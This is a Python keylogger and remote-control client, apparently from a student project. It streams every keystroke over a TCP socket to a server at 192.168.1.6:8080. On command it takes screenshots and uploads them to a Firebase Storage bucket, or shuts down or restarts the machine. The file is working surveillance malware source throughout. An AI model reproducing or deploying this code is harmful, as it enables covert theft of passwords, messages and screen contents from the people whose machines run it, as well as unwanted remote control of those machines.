from pynput.keyboard import Listener
import socket
import pyautogui
from datetime import datetime
import os
from firebase_admin import credentials, storage
cred = credentials.Certificate("credentials.json")
firebase_admin.initialize_app(cred, {"storageBucket": "pbl4-09092003.appspot.com"})


clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

serverParent = '192.168.1.6'
serverPort = 8080
try:
    clientSocket.connect((serverParent, serverPort))
except Exception as e:
    print("Error connecting to server:", str(e))
if clientSocket:
    print("connecting to server")

def on_press(key):
    try:
        # clientSocket.send("hehe")
        key = str(key)
        key = key.replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        clientSocket.sendall(key.encode('utf-8'))
    except Exception as e:
        print("Error: " + str(e))

def takeScreenshot():
    now = datetime.now()
    nameScreen = now.strftime("%Y%m%d-%H%M%S") + ".png"
    screenshot = pyautogui.screenshot()
    screenshot.save(nameScreen)

    # Lưu ảnh vào Firebase Storage
    bucket = storage.bucket()
    blob = bucket.blob(nameScreen)
    blob.upload_from_filename(nameScreen)
# Start keylogger immediately upon connection
with Listener(on_press=on_press) as parent:
    try:
        while True:
            message = clientSocket.recv(1024).decode('utf-8')
            print("Message:" + message)
            if message == 'screenshots':
                takeScreenshot()
            elif message == 'shutdown':
                os.system("shutdown /s /t 1")
            elif message == 'restart':
                os.system("shutdown /r /t 1")
    except Exception as e:
        print("Error: " + str(e))
    finally:
        parent.stop()
        parent.join()